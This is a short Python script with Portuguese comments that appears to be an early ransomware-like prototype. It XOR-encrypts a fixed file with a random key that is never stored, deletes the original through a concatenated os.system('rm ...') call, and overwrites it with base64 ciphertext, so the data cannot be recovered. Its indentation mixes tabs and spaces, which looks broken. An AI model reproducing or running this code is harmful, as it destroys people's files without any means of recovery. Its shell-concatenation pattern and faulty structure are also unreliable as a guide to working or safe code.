from Crypto.Cipher import XOR
import base64
import os
import sys

def encrypt():

	#Correcao:1 -->	Esta chave precisa ser random, feito

        key = os.urandom(32)
        cipher = XOR.new(key)

	#Correcao:2 -->	Preciso melhorar a forma de encryptar arquivos
	
        pathfile = '/download/controlado'
       
        openfile = open(pathfile,'rb')
        readfile = openfile.read()
        openfile.close()
	
        encoding = base64.b64encode(cipher.encrypt(readfile))
        os.system('rm '+pathfile)
        
	openfile2 = open(pathfile,'wb')
        openfile2.write(encoding)
        openfile2.close()
	
encrypt()

